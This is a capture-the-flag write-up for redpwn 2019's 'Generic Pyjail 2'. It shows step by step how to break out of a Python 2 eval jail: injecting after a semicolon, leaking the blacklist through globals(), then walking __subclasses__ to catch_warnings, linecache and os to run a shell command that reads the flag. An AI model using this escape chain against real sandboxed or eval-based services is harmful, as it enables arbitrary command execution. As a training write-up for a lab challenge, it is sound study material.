@@ -1,0 +1,78 @@
+# Generic Pyjail 2 - Misc
+
+### [~$ cd ..](../)
+
+>genericpyjail2
+>
+>Written by: dns
+>
+>how unoriginal do you have to be to make two of these
+>
+>nc chall2.2019.redpwn.net 6007
+
+The way we had to inject was here a little bit more difficult to find, compared to Generic Pyjail. The service prints what we send, but doesn't leak a lot of information:
+
+```
+wow! again, there's a file called flag.txt! insane!
+0
+now it's  0 !
+x
+now it's  x !
+globals()
+now it's  globals() !
+'
+now it's  ' !
+Exception:  EOL while scanning string literal (<string>, line 1)
+test
+now it's  test !
+Exception:  name 'test' is not defined
+print(42)
+now it's  print(42) !
+Exception:  invalid syntax (<string>, line 1)
+```
+
+We can notice here that a variable `x` exists and that the output of the functions (such as `globals()`) are not displayed.
+Because of the last line, one can guess that some stuff are already put in the command before our input. Closing the first command with a semi-colon was actually the trick:
+
+```
+0;print(42)
+now it's  0;print(42) !
+42
+```
+
+We can now print what we want, so let's leak some hints such as blacklisted words:
+
+```
+0;print(globals())
+now it's  0;print(globals()) !
+{'gone': ['open', 'file', 'execfile', 'compile', 'reload', '__import__', 'eval', 'input'], 'e': NameError("name 'os' is not defined",), '__builtins__': <module '__builtin__' (built-in)>, '__file__': 'jail2.py', '__package__': None, 'func': 'input', 'x': 0, '__name__': '__main__', '__doc__': None}
+```
+
+CTF experience played its role here, as we knew that we had to do deep objection inspection so as to find a reference to the `os` package. What we want here is to get the module `warnings` since the latter has a reference to interesting modules:
+
+```
+0;print(().__class__.__base__.__subclasses__())
+now it's  0;print(().__class__.__base__.__subclasses__()) !
+[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
+```
+
+At index 59, a reference to `warnings.catch_warnings` can be found ! We knew that we had to find `linecache`, and then `os` from the latter. Accessing module's globals was the solution:
+
+```
+wow! again, there's a file called flag.txt! insane!
+0;print((().__class__.__base__.__subclasses__()[59].__repr__.im_func.func_globals["linecache"].os))
+now it's  0;print((().__class__.__base__.__subclasses__()[59].__repr__.im_func.func_globals["linecache"].os)) !
+<module 'os' from '/usr/lib/python2.7/os.pyc'>
+```
+
+And finally
+
+```
+0;print((().__class__.__base__.__subclasses__()[59].__repr__.im_func.func_globals["linecache"].os).system("cat\x20flag.txt"))
+now it's  0;print((().__class__.__base__.__subclasses__()[59].__repr__.im_func.func_globals["linecache"].os).system("cat\x20flag.txt")) !
+flag{sub_sub_sub_references}
+```
+
+FLAG: **flag{sub_sub_sub_references}**
+
+EOF
